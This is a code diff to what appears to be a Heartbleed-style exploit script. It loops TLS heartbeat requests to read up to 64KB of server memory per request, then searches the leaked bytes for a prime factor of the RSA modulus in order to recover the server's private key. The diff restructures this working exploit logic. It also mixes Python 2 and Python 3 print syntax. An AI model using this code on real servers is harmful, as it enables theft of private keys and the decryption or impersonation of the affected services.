@@ -101,24 +101,28 @@ heartbeat.create(type=1,
 
 # up the range numbs to get more memory, sometimes it repeats.
 
+resp = ""
+
 for x in range(0, numb):
     for result in connection._sendMsg(heartbeat):
         pass
 
-    resp = connection.readPOC(0xffff)
-    print(resp)
-    resp = bytearray(resp)
+    resp = resp + connection.readPOC(0xffff)
 
-    if find_priv_key:
-        for i in range(0, len(resp)-prime_len_bytes):
-            # reverse the bytes, only works for little-endian
-            # targets (FIXME? Probably not worth it, would have
-            # to guess word length on big-endian.)
-            data = resp[i+prime_len_bytes:i:-1]
-            data = bytesToNumber(data)
-            #if data != 0: print(data)
-            if data > 1 and pubkey != None and (pubkey.n % data) == 0:
-                print("Success! p = %i, q = %i" % (data, pubkey.n//data))
-                sys.exit(0)
+resp = bytearray(resp)
+
+if find_priv_key:
+    for i in range(0, len(resp)-prime_len_bytes):
+        # reverse the bytes, only works for little-endian
+        # targets (FIXME? Probably not worth it, would have
+        # to guess word length on big-endian.)
+        data = resp[i+prime_len_bytes:i:-1]
+        data = bytesToNumber(data)
+        #if data != 0: print(data)
+        if data > 1 and pubkey != None and (pubkey.n % data) == 0:
+            print("Success! p = %i, q = %i" % (data, pubkey.n//data))
+            sys.exit(0)
+else:
+    print resp
 
 connection.close()
